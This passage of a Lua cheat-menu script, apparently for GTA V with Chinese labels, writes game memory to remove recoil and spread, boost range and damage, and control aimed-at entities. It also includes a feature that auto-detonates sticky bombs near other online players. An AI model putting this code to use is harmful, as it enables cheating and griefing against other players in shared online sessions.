            PED.SET_PED_COMBAT_ATTRIBUTES(rider, 46, true)
            TASK.TASK_COMBAT_PED(rider, player_ped, 0, 16)
            if godmodeatk then
                ENTITY.SET_ENTITY_INVINCIBLE(bike, true)
                ENTITY.SET_ENTITY_INVINCIBLE(rider, true)
            end
            if givegun then
                WEAPON.GIVE_WEAPON_TO_PED(rider, atkgun, 0, false, true)
            end
        end
    end
end

good_guns = {453432689, 171789620, 487013001, -1716189206, 1119849093}


local function getWeaponHash(ped)
    local wpn_ptr = memory.alloc_int()
    if WEAPON.GET_CURRENT_PED_VEHICLE_WEAPON(ped, wpn_ptr) then -- only returns true if the weapon is a vehicle weapon
        return memory.read_int(wpn_ptr), true
    end
    return WEAPON.GET_SELECTED_PED_WEAPON(ped), false
end

local function address_from_pointer_chain(address, offsets)
    local addr = address
    for k = 1, (#offsets - 1) do
        addr = memory.read_long(addr + offsets[k])
        if addr == 0 then
            return 0
        end
    end
    addr += offsets[#offsets]
    return addr
end

local function readWeaponAddress(storeTable, offset, stopIfModified)
    if util.is_session_transition_active() then return 0 end
    local userPed = players.user_ped()
    local weaponHash, vehicleWeapon = getWeaponHash(userPed)

    if stopIfModified and storeTable[weaponHash] then return 0 end

    local pointer = (vehicleWeapon and 0x70 or 0x20)
    local address = address_from_pointer_chain(entities.handle_to_pointer(userPed), {0x10B8, pointer, offset})
    if address == 0 then menu.toast('Failed to find memory address.') return 0 end

    if storeTable[weaponHash] == nil then
        storeTable[weaponHash] = {
            address = address,
            original = memory.read_float(address)
        }
    end
    return weaponHash
end

function resetWeapons(modifiedWeapons)
    for hash, _ in pairs(modifiedWeapons) do
        memory.write_float(modifiedWeapons[hash].address, modifiedWeapons[hash].original)
        modifiedWeapons[hash] = nil
    end
end

--武器设置

modifiedRecoil = {}
function gunpro()
    local weaponHash = readWeaponAddress(modifiedRecoil, 0x2F4, true)
    if weaponHash == 0 then return end
    memory.write_float(modifiedRecoil[weaponHash].address, 0)
end

modifiedRange = {}
function maxrange()
    if util.is_session_transition_active() then return end
    local userPed = players.user_ped()
    local weaponHash, vehicleWeapon = getWeaponHash(userPed)
    if modifiedRange[weaponHash] then return end
    local pointer = (vehicleWeapon and 0x70 or 0x20)
    local userPedPointer = entities.handle_to_pointer(userPed)
    modifiedRange[weaponHash] = {
        minAddress   = address_from_pointer_chain(userPedPointer, {0x10B8, pointer, 0x298}),
        maxAddress   = address_from_pointer_chain(userPedPointer, {0x10B8, pointer, 0x29C}),
        rangeAddress = address_from_pointer_chain(userPedPointer, {0x10B8, pointer, 0x28C}),
    }

    if modifiedRange[weaponHash].minAddress == 0 or modifiedRange[weaponHash].maxAddress == 0 or modifiedRange[weaponHash].rangeAddress == 0 then menu.toast('Failed to find memory address.') return end

    modifiedRange[weaponHash].originalMin   = memory.read_float(modifiedRange[weaponHash].minAddress)
    modifiedRange[weaponHash].originalMax   = memory.read_float(modifiedRange[weaponHash].maxAddress)
    modifiedRange[weaponHash].originalRange = memory.read_float(modifiedRange[weaponHash].rangeAddress)

    memory.write_float(modifiedRange[weaponHash].minAddress,   150000)  --because the map is about 15km tall
    memory.write_float(modifiedRange[weaponHash].maxAddress,   150000)
    memory.write_float(modifiedRange[weaponHash].rangeAddress, 150000)
end

modifiedSpread = {}
function nospread()
    local weaponHash = readWeaponAddress(modifiedSpread, 0x74, true)
    if weaponHash == 0 then return end
    memory.write_float(modifiedSpread[weaponHash].address, 0)
end

modifiedSpinup = {
    [1] = {hash = util.joaat('weapon_minigun')},
    [2] = {hash = util.joaat('weapon_rayminigun')},
}

function nospinup()
    local weaponHash = WEAPON.GET_SELECTED_PED_WEAPON(players.user_ped())
    for i = 1, #modifiedSpinup do
        if weaponHash == modifiedSpinup[i].hash then
            modifiedSpinup[i].address = address_from_pointer_chain(entities.handle_to_pointer(players.user_ped()), {0x10B8, 0x20, 0x144})
            if modifiedSpinup[i].address == 0 then return end
            memory.write_float(modifiedSpinup[i].address, 0)
        end
    end
end

modifiedCarForce = {}
modifiedHeliForce = {}
modifiedPedForce = {}
function damagemoded()
    local weaponHash = readWeaponAddress(modifiedCarForce, 0x0E0, false)
    if weaponHash == 0 then return end
    memory.write_float(modifiedCarForce[weaponHash].address, modifiedCarForce[weaponHash].original * 99999999999999)

    weaponHash = readWeaponAddress(modifiedHeliForce, 0x0E4, false)
    if weaponHash == 0 then return end
    memory.write_float(modifiedHeliForce[weaponHash].address, modifiedHeliForce[weaponHash].original * 99999999999999)

    weaponHash = readWeaponAddress(modifiedPedForce, 0x0DC, false)
    if weaponHash == 0 then return end
    memory.write_float(modifiedPedForce[weaponHash].address, modifiedPedForce[weaponHash].original * 99999999999999)
end

extraZoom2 = 0
modifiedAimFov = {}
---@diagnostic disable-next-line: undefined-global
function gunzoom()
    JSkey.disable_control_action(0, 'INPUT_SNIPER_ZOOM_IN_ONLY')
        JSkey.disable_control_action(0, 'INPUT_SNIPER_ZOOM_OUT_ONLY')

        if not JSkey.is_control_pressed(0, 'INPUT_AIM') then
            extraZoom2 = 0
            return
        end

        local step = if extraZoom2 > 60 or extraZoom2 < -5 then 3 else 6

        if not (extraZoom2 <= -35) and JSkey.is_disabled_control_just_pressed(0, 'INPUT_SNIPER_ZOOM_IN_ONLY') then
            extraZoom2 -= step
        elseif not (extraZoom2 >= 100) and JSkey.is_disabled_control_just_pressed(0, 'INPUT_SNIPER_ZOOM_OUT_ONLY') then
            extraZoom2 += step
        end

        local weaponHash = readWeaponAddress(modifiedAimFov, 0x2FC, false)
        if weaponHash == 0 then return end
        memory.write_float(modifiedAimFov[weaponHash].address, modifiedAimFov[weaponHash].original + extraZoom2)
end

extraZoom = 0
modifiedZoomFov = {}
function enablezoomfov()
    local weaponHash = readWeaponAddress(modifiedZoomFov, 0x410, false)
    if weaponHash == 0 then return end
    memory.write_float(modifiedZoomFov[weaponHash].address,  modifiedZoomFov[weaponHash].original + extraZoom)
end

function zoomaimfov(value)
    extraZoom = (value - 100) / 100
    modifiedZoomWeapon = nil
end


local STOREDIR = filesystem.scripts_dir() .. "/lib/" .. '/baibai1lib/' .. '/Weapon Config/'
local LIBDIR = filesystem.scripts_dir() .. "lib\\baibai1lib\\"
do_autoload = false
local wpcmpTable = {}
local weapons_table = {}
if filesystem.exists(LIBDIR .. "component_resources.lua") then
    wpcmpTable = require("lib.baibai1lib.component_resources")
    weapons_table = util.get_weapons()
else
    util.toast("您没有正确安装资源。\n确保组件资源lua在 " .. LIBDIR .. " directory")
    util.stop_script()
end
local attachments_dict = wpcmpTable[1]
local liveries_dict = wpcmpTable[2]

function Save_Weapon_Profile()
    local charS,charE = "   ","\n"
    local player = players.user_ped()
    file = io.open(STOREDIR .. "loadout.lua", "wb")
    file:write("return {" .. charE)
    local num_weapons = 0
    for _, weapon in weapons_table do
        local weapon_hash = weapon.hash

        if WEAPON_SAVE_WEAPON.HAS_PED_GOT_WEAPON(player, weapon_hash, false) then
            num_weapons = num_weapons + 1
            if num_weapons > 1 then
                file:write("," .. charE)
            end
            file:write(charS .. "[" .. weapon_hash .. "] = ")
            --WEAPON.SET_CURRENT_PED_WEAPON(player, weapon_hash, true)
            local num_attachments = 0
            for attachment_hash, _ in attachments_dict do
                if (WEAPON_SAVE_WEAPON.DOES_WEAPON_TAKE_WEAPON_COMPONENT(weapon_hash, attachment_hash)) then
                    --util.yield(10)
                    if WEAPON_SAVE_WEAPON.HAS_PED_GOT_WEAPON_COMPONENT(player, weapon_hash, attachment_hash) then
                        num_attachments = num_attachments + 1
                        if num_attachments == 1 then
                            file:write("{")
                            file:write(charE .. charS .. charS .. "[\"attachments\"] = {")
                        else
                            file:write(",")
                        end
                        file:write(charE .. charS .. charS .. charS .. "[" .. num_attachments .. "] = " .. attachment_hash)
                    end
                end
            end
            local cur_tint = WEAPON_SAVE_WEAPON.GET_PED_WEAPON_TINT_INDEX(player, weapon_hash)
            if num_attachments > 0 then
                file:write(charE .. charS .. charS .. "},")
            else
                file:write("{")
            end
            file:write(charE .. charS .. charS .. "[\"tint\"] = " .. cur_tint)
            --- Livery
            for livery_hash, _ in liveries_dict do
                if WEAPON_SAVE_WEAPON.HAS_PED_GOT_WEAPON_COMPONENT(player, weapon_hash, livery_hash) then
                    local colour = WEAPON_SAVE_WEAPON.GET_PED_WEAPON_COMPONENT_TINT_INDEX(player, weapon_hash, livery_hash)
                    file:write("," .. charE .. charS .. charS .. "[\"livery\"] = {")
                    file:write(charE .. charS .. charS .. charS .. "[\"hash\"] = " .. livery_hash .. ",")
                    file:write(charE .. charS .. charS .. charS .. "[\"colour\"] = " .. colour)
                    file:write(charE .. charS .. charS .. "}")
                    break
                end
            end
            file:write(charE .. charS .. "}")
        end
    end
    file:write(charE .. "}")
    file:close()
    util.toast("保存完成了！")
end

function Load_Out_Weapon()
    if filesystem.exists(STOREDIR .. "loadout.lua") then
        player = players.user_ped()
        WEAPON_SAVE_WEAPON.REMOVE_ALL_PED_WEAPONS(player, false)
        WEAPON_SAVE_WEAPON.SET_CAN_PED_SELECT_ALL_WEAPONS(player, true)
        local loadout = require("/lib/" .. '/baibai1lib/' .. '/Weapon Config/' .. "loadout")
        for w_hash, attach_dict in loadout do
            WEAPON_SAVE_WEAPON.GIVE_WEAPON_TO_PED(player, w_hash, 10, false, true)
            if attach_dict.attachments ~= nil then
                for _, hash in attach_dict.attachments do
                    WEAPON_SAVE_WEAPON.GIVE_WEAPON_COMPONENT_TO_PED(player, w_hash, hash)
                end
            end
            WEAPON_SAVE_WEAPON.SET_PED_WEAPON_TINT_INDEX(player, w_hash, attach_dict["tint"])
            if attach_dict.livery ~= nil then
                WEAPON_SAVE_WEAPON.GIVE_WEAPON_COMPONENT_TO_PED(player, w_hash, attach_dict.livery.hash)
                WEAPON_SAVE_WEAPON.SET_PED_WEAPON_COMPONENT_TINT_INDEX(player, w_hash, attach_dict.livery.hash, attach_dict.livery.colour)
            end
        end
        regen_menu()
        util.toast("配备装备")
        menu.trigger_commands("fillammo")
    else
        util.toast("你以前从未保存过，为什么要点这个选项 操你妈的 *.*")
    end
    package.loaded["store\\loadout"] = nil
end

function Auto_Load_Out_Weapon(on)
    do_autoload = on
end

function Dele_All_Weapon()
    WEAPON_SAVE_WEAPON.REMOVE_ALL_PED_WEAPONS(players.user_ped(), false)
    regen_menu()
    util.toast("你的武器被人用了！")
end

function regen_menu()
    for _, weapon in weapons_table do
        if weapons_action[weapon.hash] ~= nil then
            if weapons_action[weapon.hash]:isValid() then
                weapons_action[weapon.hash]:delete()
            end
        end
    end
    weapons_action = {}
    attachments_action = {}
    weapon_deletes = {}
    cosmetics_list = {}
    tints_slider = {}
    livery_action_divider = {}
    livery_actions = {}
    livery_colour_slider = {}
    livery = {}

    for _, weapon in weapons_table do
        local category = weapon.category
        local weapon_name = util.get_label_text(weapon.label_key)
        local weapon_hash = weapon.hash
        if WEAPON_SAVE_WEAPON.HAS_PED_GOT_WEAPON(players.user_ped(), weapon_hash, false) then
            generate_for_new_weapon(category, weapon_name, weapon_hash, false)
        else
            weapons_action[weapon_hash] = categories[category]:action(weapon_name .. " (未配备)", {}, "配备 " .. weapon_name,
                    function()
                        weapons_action[weapon_hash]:delete()
                        equip_weapon(category, weapon_name, weapon_hash)
                    end
            )
        end
        WEAPON_SAVE_WEAPON.ADD_AMMO_TO_PED(players.user_ped(), weapon_hash, 10) --- if a special ammo type has been equipped.. it should get some ammo
    end
end

function equip_comp(category, weapon_name, weapon_hash, attachment_hash)
    WEAPON_SAVE_WEAPON.GIVE_WEAPON_COMPONENT_TO_PED(players.user_ped(), weapon_hash, attachment_hash)
end

function equip_weapon(category, weapon_name, weapon_hash)
    WEAPON_SAVE_WEAPON.GIVE_WEAPON_TO_PED(players.user_ped(), weapon_hash, 10, false, true)
    util.yield(10)
    weapon_deletes[weapon_name] = nil
    generate_for_new_weapon(category, weapon_name, weapon_hash, true)
end

function generate_for_new_weapon(category, weapon_name, weapon_hash, focus)
    weapons_action[weapon_hash] = categories[category]:list(weapon_name, {}, "编辑的附件 " .. weapon_name,
            function()
                WEAPON_SAVE_WEAPON.SET_CURRENT_PED_WEAPON(players.user_ped(), weapon_hash, true)
                generate_attachments(category, weapon_name, weapon_hash)
            end
    )
    if focus then
        weapons_action[weapon_hash]:trigger()
    end
end

function generate_cosmetics(weapon_hash, weapon_name)
    -- clear old cosmetic stuff
    livery_action_divider = {}
    livery_colour_slider = {}
    livery = {}
    tints_slider = {}
    livery_actions = {}

    if cosmetics_list[weapon_hash] ~= nil then
        if cosmetics_list[weapon_hash]:isValid() then
            cosmetics_list[weapon_hash]:delete()
        end
        regenerated_cosmetics = true
    end
    cosmetics_list[weapon_hash] = weapons_action[weapon_hash]:list("表面", {}, "",
            function()
                local tint_count = WEAPON_SAVE_WEAPON.GET_WEAPON_TINT_COUNT(weapon_hash)
                local cur_tint = WEAPON_SAVE_WEAPON.GET_PED_WEAPON_TINT_INDEX(player, weapon_hash)

                if tints_slider[weapon_hash] == nil then
                    tints_slider[weapon_hash] = cosmetics_list[weapon_hash]:slider("色调", {}, "选择适合你的色调 " .. weapon_name, 0, tint_count - 1, cur_tint, 1,
                            function(change)
                                WEAPON_SAVE_WEAPON.SET_PED_WEAPON_TINT_INDEX(player, weapon_hash, change)
                            end
                    )
                end

                --- livery colour
                local has_liveries = false
                for livery_hash, _ in liveries_dict do
                    if WEAPON_SAVE_WEAPON.DOES_WEAPON_TAKE_WEAPON_COMPONENT(weapon_hash, livery_hash) then
                        has_liveries = true
                        break
                    end
                end


                if has_liveries then
                    --- get current camo component
                    for hash, _ in liveries_dict do
                        if WEAPON_SAVE_WEAPON.HAS_PED_GOT_WEAPON_COMPONENT(player, weapon_hash, hash) then
                            livery[weapon_hash] = hash
                            break
                        end
                    end
                    --- livery colour slider
                    if livery_colour_slider[weapon_hash] == nil then
                        local cur_ctint_colour = WEAPON_SAVE_WEAPON.GET_PED_WEAPON_COMPONENT_TINT_INDEX(player, weapon_hash, livery[weapon_hash])
                        if cur_ctint_colour == -1 then cur_ctint_colour = 0 end
                        livery_colour_slider[weapon_hash] = cosmetics_list[weapon_hash]:slider("皮肤颜色", {}, "改变你的皮肤颜色", 0, 31, cur_ctint_colour, 1,
                                function(index)
                                    if livery[weapon_hash] == nil then
                                        util.toast("你的武器上没有皮肤")
                                    else
                                        WEAPON_SAVE_WEAPON.SET_PED_WEAPON_COMPONENT_TINT_INDEX(player, weapon_hash, livery[weapon_hash], index)
                                    end
                                end
                        )
                    end

                    if livery_action_divider[weapon_hash] == nil then
                        livery_action_divider[weapon_hash] = cosmetics_list[weapon_hash]:divider("皮肤")
                    end
                    --- livery equip actions
                    for livery_hash, label in liveries_dict do
                        if WEAPON_SAVE_WEAPON.DOES_WEAPON_TAKE_WEAPON_COMPONENT(weapon_hash, livery_hash) and livery_actions[weapon_hash..livery_hash] == nil then
                            livery_actions[weapon_hash .. livery_hash] = cosmetics_list[weapon_hash]:action(util.get_label_text(label), {}, "",
                                    function()
                                        livery[weapon_hash] = livery_hash
                                        equip_comp(category, weapon_name, weapon_hash, livery_hash)
                                        WEAPON_SAVE_WEAPON.SET_PED_WEAPON_COMPONENT_TINT_INDEX(player, weapon_hash, livery[weapon_hash], livery_colour_slider[weapon_hash].value)
                                    end
                            )
                        end
                    end
                end
            end
    )
end

function generate_attachments(category, weapon_name, weapon_hash)
    if weapon_deletes[weapon_name] == nil then
        weapon_deletes[weapon_name] = weapons_action[weapon_hash]:action("删去 " .. weapon_name, {}, "",
                function()
                    WEAPON_SAVE_WEAPON.REMOVE_WEAPON_FROM_PED(players.user_ped(), weapon_hash)
                    cosmetics_list[weapon_hash]:delete()
                    cosmetics_list[weapon_hash] = nil
                    livery_action_divider[weapon_hash] = nil
                    weapons_action[weapon_hash]:delete()

                    util.toast(weapon_name .. " 已删除")
                    weapons_action[weapon_hash] = categories[category]:action(weapon_name .. " (未配备)", {}, "配备 " .. weapon_name,
                            function()
                                for a_key, _ in attachments_action do
                                    if string.find(a_key, weapon_hash) ~= nil then
                                        attachments_action[a_key] = nil
                                    end
                                end
                                menu.delete(weapons_action[weapon_hash])
                                equip_weapon(category, weapon_name, weapon_hash)
                                weapon_deletes[weapon_name] = nil
                            end
                    )
                    weapons_action[weapon_hash]:focus()
                end
        )
    end

    local has_attachments = false
    for livery_hash, _ in attachments_dict do
        if WEAPON_SAVE_WEAPON.DOES_WEAPON_TAKE_WEAPON_COMPONENT(weapon_hash, livery_hash) then
            has_attachments = true
            break
        end
    end

    if cosmetics_list[weapon_hash] == nil then
        generate_cosmetics(weapon_hash, weapon_name)
        if has_attachments then
            weapons_action[weapon_hash]:divider("附件")
        end
    end

    for attachment_hash, attachment_label in attachments_dict do
        local attachment_name = util.get_label_text(attachment_label)
        if (WEAPON_SAVE_WEAPON.DOES_WEAPON_TAKE_WEAPON_COMPONENT(weapon_hash, attachment_hash)) then
            if (attachments_action[weapon_hash .. " " .. attachment_hash] ~= nil) then attachments_action[weapon_hash .. " " .. attachment_hash]:delete() end
            attachments_action[weapon_hash .. " " .. attachment_hash] = weapons_action[weapon_hash]:action(attachment_name, {}, "配备 " .. attachment_name .. " 在您的 " .. weapon_name,
                    function()
                        equip_comp(category, weapon_name, weapon_hash, attachment_hash)
                        if (string.find(attachment_label, "弹夹") ~= nil or string.find(attachment_label, "炮弹") ~= nil) and WEAPON_SAVE_WEAPON.HAS_PED_GOT_WEAPON_COMPONENT(players.user_ped(), weapon_hash, attachment_hash) then
                            WEAPON_SAVE_WEAPON.ADD_AMMO_TO_PED(players.user_ped(), weapon_hash, 10)
                        end
                    end
            )
        end
    end
end


categories = {}
weapons_action = {}
attachments_action = {}
weapon_deletes = {}
cosmetics_list = {}
tints_slider = {}
livery_action_divider = {}
livery_actions = {}
livery_colour_slider = {}
livery = {}
function Weapon_Check_Save()
for _, weapon in weapons_table do
    local category = weapon.category
    if categories[category] == nil then
        categories[category] = custom_weapon_save:list(category, {}, "编辑的武器 " .. category .. " 类别")
    end
end
regen_menu()
end

proxyStickySettings = {players = true, npcs = false, radius = 2}
local function autoExplodeStickys(ped)
    local pos = ENTITY.GET_ENTITY_COORDS(ped, true)
    if MISC.IS_PROJECTILE_TYPE_WITHIN_DISTANCE(pos.x, pos.y, pos.z, util.joaat('weapon_stickybomb'), proxyStickySettings.radius, true) then
        WEAPON.EXPLODE_PROJECTILES(players.user_ped(), util.joaat('weapon_stickybomb'))
    end
end

function proxyStickys()
    if proxyStickySettings.players then
        local specificWhitelistGroup = {user = false,  friends = whitelistGroups.friends, strangers = whitelistGroups.strangers}
        local playerList = getNonWhitelistedPlayers(whitelistListTable, specificWhitelistGroup, whitelistedName)
        for _, pid in pairs(playerList) do
            local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
            autoExplodeStickys(ped)
        end
    end
    if proxyStickySettings.npcs then
        local pedHandles = entities.get_all_peds_as_handles()
        for _, ped in pairs(pedHandles) do
            if not PED.IS_PED_A_PLAYER(ped) then
                autoExplodeStickys(ped)
            end
        end
    end
end

function proxyStickys_players(toggle)
    proxyStickySettings.players = toggle
end

function proxystickys_npc(toggle)
    proxyStickySettings.npcs = toggle
end

function proxysticks_radius(value)
    proxyStickySettings.radius = value
end


function bulletchange()
    for id, data in pairs(weapon_stuff) do
        local name = data[1]
        local weapon_name = data[2]
        local a = false
        menu.toggle(weapon_thing, name, {}, "", function(toggle)
            a = toggle
            while a do
                local weapon = util.joaat(weapon_name)
                projectile = weapon
                while not WEAPON.HAS_WEAPON_ASSET_LOADED(projectile) do
                    WEAPON.REQUEST_WEAPON_ASSET(projectile, 31, false)
                    util.yield(10)
                end
                local inst = v3.new()
                if PED.IS_PED_SHOOTING(PLAYER.PLAYER_PED_ID()) then
                    if not WEAPON.GET_PED_LAST_WEAPON_IMPACT_COORD(PLAYER.PLAYER_PED_ID(), inst) then
                        v3.set(inst,CAM.GET_FINAL_RENDERED_CAM_ROT(2))
                        local tmp = v3.toDir(inst)
                        v3.set(inst, v3.get(tmp))
                        v3.mul(inst, 1000)
                        v3.set(tmp, CAM.GET_FINAL_RENDERED_CAM_COORD())
                        v3.add(inst, tmp)
                        v3.free(tmp)
                    end
                    local x, y, z = v3.get(inst)
                    local wpEnt = WEAPON.GET_CURRENT_PED_WEAPON_ENTITY_INDEX(PLAYER.PLAYER_PED_ID(), false)
                    local wpCoords = ENTITY.GET_ENTITY_BONE_POSTION(wpEnt, ENTITY.GET_ENTITY_BONE_INDEX_BY_NAME(wpEnt, "gun_muzzle"))
                    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(wpCoords.x, wpCoords.y, wpCoords.z, x, y, z, 1, true, weapon, PLAYER.PLAYER_PED_ID(), true, false, 1000)
                end
                util.yield()
            end
            local pos = ENTITY.GET_ENTITY_COORDS(players.user_ped())
            MISC.CLEAR_AREA_OF_PROJECTILES(pos.x, pos.y, pos.z, 999999, 0)
        end)
    end
end

------- 实体控制枪 -------
function entity_control_all(menu_parent, ent)
    menu.action(menu_parent, "检测该实体是否存在", {}, "", function()
        if ENTITY.DOES_ENTITY_EXIST(ent) then
            util.toast("实体存在")
        else
            util.toast("该实体已经不存在，请删除此条实体记录！")
        end
    end)
    menu.action(menu_parent, "删除此条实体记录", {}, "", function()
        menu.delete(menu_parent)
        clearTableValue(control_ent_menu_list, menu_parent)
        clearTableValue(control_ent_list, ent)
    end)
    --- ---
    menu.divider(menu_parent, "Entity")

    menu.toggle(menu_parent, "无敌", {}, "", function(toggle)
        ENTITY.SET_ENTITY_INVINCIBLE(ent, toggle)
        ENTITY.SET_ENTITY_PROOFS(ent, toggle, toggle, toggle, toggle, toggle, toggle, toggle, toggle)
    end)
    menu.toggle(menu_parent, "冻结", {}, "", function(toggle)
        ENTITY.FREEZE_ENTITY_POSITION(ent, toggle)
    end)
    --- ---
    menu.divider(menu_parent, "血量")
    menu.action(menu_parent, "获取当前血量", {}, "", function()
        util.toast("当前血量: " .. ENTITY.GET_ENTITY_HEALTH(ent))
    end)
    local control_ent_health = 1000
    menu.slider(menu_parent, "血量", { "control_ent_health" }, "", 0, 30000, 1000, 100, function(value)
        control_ent_health = value
    end)
    menu.action(menu_parent, "设置血量", {}, "", function()
        ENTITY.SET_ENTITY_HEALTH(ent, control_ent_health)
    end)
    --- ---
    menu.divider(menu_parent, "移动")
    menu.click_slider(menu_parent, "前/后移动", {}, "", -100, 100, 0, 1, function(value)
        local coords = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(ent, 0.0, value, 0.0)
        ENTITY.SET_ENTITY_COORDS(ent, coords.x, coords.y, coords.z, true, false, false, false)
    end)

    menu.click_slider(menu_parent, "左/右移动", {}, "", -100, 100, 0, 1, function(value)
        local coords = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(ent, value, 0.0, 0.0)
        ENTITY.SET_ENTITY_COORDS(ent, coords.x, coords.y, coords.z, true, false, false, false)
    end)

    menu.click_slider(menu_parent, "上/下移动", {}, "", -100, 100, 0, 1, function(value)
        local coords = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(ent, 0.0, 0.0, value)
        ENTITY.SET_ENTITY_COORDS(ent, coords.x, coords.y, coords.z, true, false, false, false)
    end)

    menu.click_slider(menu_parent, "朝向", {}, "", -360, 360, 0, 10, function(value)
        local head = ENTITY.GET_ENTITY_HEADING(ent)
        ENTITY.SET_ENTITY_HEADING(ent, head + value)
    end)
    --- ---
    menu.divider(menu_parent, "传送")
    menu.click_slider(menu_parent, "传送到我面前", {}, "", -10, 10, 2, 1, function(value)
        local coords = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(players.user_ped(), 0.0, value, 0.0)
        ENTITY.SET_ENTITY_COORDS(ent, coords.x, coords.y, coords.z, true, false, false, false)
    end)

    menu.toggle_loop(menu_parent, "锁定传送在我头上", {}, "", function()
        local coords = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(players.user_ped(), 0.0, 0.0, 2.0)
        ENTITY.SET_ENTITY_COORDS(ent, coords.x, coords.y, coords.z, true, false, false, false)
    end)

    menu.action(menu_parent, "离我的距离", {}, "", function()
        local my_pos = ENTITY.GET_ENTITY_COORDS(players.user_ped())
        local ent_pos = ENTITY.GET_ENTITY_COORDS(ent)
        util.toast(vect.dist(my_pos, ent_pos))
    end)

    menu.click_slider(menu_parent, "最大速度", { "control_ent_max_speed" }, "", 0.0, 1000.0, 30.0, 10.0, function(value)
        ENTITY.SET_ENTITY_MAX_SPEED(ent, value)
    end)

end

--- PED entity type functions ---
function entity_control_ped(menu_parent, ped)
    menu.divider(menu_parent, "Ped")

    menu.action(menu_parent, "传送到我的载具", {}, "", function()
        local vehicle = PED.GET_VEHICLE_PED_IS_IN(players.user_ped(), false)
        if vehicle then
            if VEHICLE.ARE_ANY_VEHICLE_SEATS_FREE(vehicle) then
                PED.SET_PED_INTO_VEHICLE(ped, vehicle, -2)
            end
        end
    end)

    menu.action(menu_parent, "移除全部武器", {}, "", function()
        WEAPON.REMOVE_ALL_PED_WEAPONS(ped)
    end)

  
    menu.action_slider(menu_parent, "给予武器", {}, "", weapon_list, function(value)
        local weaponHash = util.joaat(weapon_list_model[value])
        WEAPON.GIVE_WEAPON_TO_PED(ped, weaponHash, -1, false, true)
        WEAPON.SET_CURRENT_PED_WEAPON(ped, weaponHash, false)
    end)

    menu.action(menu_parent, "一键无敌强化NPC", {}, "适用于友方NPC", function()
        ENTITY.SET_ENTITY_INVINCIBLE(ped, true)
        ENTITY.SET_ENTITY_PROOFS(ped, true, true, true, true, true, true, true, true)
        PED.SET_PED_CAN_RAGDOLL(ped, false)

        PED.SET_PED_HIGHLY_PERCEPTIVE(ped, true)
        PED.SET_PED_VISUAL_FIELD_PERIPHERAL_RANGE(ped, 500.0)
        PED.SET_PED_SEEING_RANGE(ped, 500.0)
        PED.SET_PED_HEARING_RANGE(ped, 500.0)

        WEAPON.SET_PED_INFINITE_AMMO_CLIP(ped, true)
        PED.SET_PED_SHOOT_RATE(ped, 1000.0)
        PED.SET_PED_ACCURACY(ped, 100.0)
        PED.SET_PED_CAN_BE_SHOT_IN_VEHICLE(ped, true)

        PED.SET_PED_COMBAT_ATTRIBUTES(ped, 5, true) --AlwaysFight
        PED.SET_PED_COMBAT_ATTRIBUTES(ped, 12, true) --BlindFireWhenInCover
        PED.SET_PED_COMBAT_ATTRIBUTES(ped, 27, true) --PerfectAccuracy
        PED.SET_PED_COMBAT_MOVEMENT(ped, 2)
        PED.SET_PED_COMBAT_ABILITY(ped, 2)
        PED.SET_PED_COMBAT_RANGE(ped, 2)
        PED.SET_PED_TARGET_LOSS_RESPONSE(ped, 1)
        PED.SET_COMBAT_FLOAT(ped, 10, 500.0)
        util.toast("Done")
    end)

end

--- VEHICLE entity type functions ---
function entity_control_vehicle(menu_parent, vehicle)
    menu.divider(menu_parent, "Vehicle")

    menu.action(menu_parent, "踢出载具内NPC", {}, "", function()
        local seats = VEHICLE.GET_VEHICLE_MODEL_NUMBER_OF_SEATS(vehicle)
        for k = -1, seats do
            local ped = VEHICLE.GET_PED_IN_VEHICLE_SEAT(vehicle, k)
            if ped > 0 then
                PED.SET_PED_CAN_BE_KNOCKED_OFF_VEHICLE(ped, KNOCKOFFVEHICLE_EASY)
                PED.KNOCK_PED_OFF_VEHICLE(ped)
            end
        end
    end)

    menu.action(menu_parent, "拆下车门", {}, "", function()
        for i = 0, 3 do
            VEHICLE.SET_VEHICLE_DOOR_BROKEN(vehicle, i, false)
        end
    end)

    menu.toggle(menu_parent, "车门开关", {}, "", function(toggle)
        if toggle then
            for i = 0, 3 do
                VEHICLE.SET_VEHICLE_DOOR_OPEN(vehicle, i, false, false)
            end
        else
            VEHICLE.SET_VEHICLE_DOORS_SHUT(vehicle, false)
        end
    end)

    menu.toggle(menu_parent, "车门锁", {}, "", function(toggle)
        if toggle then
            VEHICLE.SET_VEHICLE_DOORS_LOCKED(vehicle, 2)
        else
            VEHICLE.SET_VEHICLE_DOORS_LOCKED(vehicle, 1)
            VEHICLE.SET_VEHICLE_DOORS_LOCKED_FOR_PLAYER(vehicle, players.user(), false)
        end
    end)

    menu.click_slider(menu_parent, "向前的速度", { "control_veh_forward_speed" }, "", 0.0, 1000.0, 30.0, 10.0, function(value)
        VEHICLE.SET_VEHICLE_FORWARD_SPEED(vehicle, value)
    end)

    menu.action(menu_parent, "修复载具", {}, "", function()
        VEHICLE.SET_VEHICLE_FIXED(vehicle)
        VEHICLE.SET_VEHICLE_ENGINE_HEALTH(vehicle, 1000.0)
    end)
end

-- 所有控制的实体
control_ent_list = {}
-- 所有控制实体的menu.list
control_ent_menu_list = {}

--返回瞄准的实体
GetEntity_PlayerIsAimingAt = function(p)
    local ent = NULL
    if PLAYER.IS_PLAYER_FREE_AIMING(p) then
        local ptr = memory.alloc_int()
        if PLAYER.GET_ENTITY_PLAYER_IS_FREE_AIMING_AT(p, ptr) then
            ent = memory.read_int(ptr)
        end
        memory.free(ptr)
        if ENTITY.IS_ENTITY_A_PED(ent) and PED.IS_PED_IN_ANY_VEHICLE(ent) then
            local vehicle = PED.GET_VEHICLE_PED_IS_IN(ent, false)
            ent = vehicle
        end
    end
    return ent
end

-- 遍历数组 判断某值是否在表中
function isInTable(tbl, value)
    for k, v in pairs(tbl) do
        if v == value then
            return true
        end
    end
    return false
end

-- 根据值清空对应的元素（非删除操作）
function clearTableValue(t, value)
    for k, v in pairs(t) do
        if v == value then
            t[k] = nil
        end
    end
end


function entitycontrol()
    local ent = GetEntity_PlayerIsAimingAt(players.user())
    if ent ~= NULL and ENTITY.DOES_ENTITY_EXIST(ent) then
        if not isInTable(control_ent_list, ent) then
            table.insert(control_ent_list, ent)
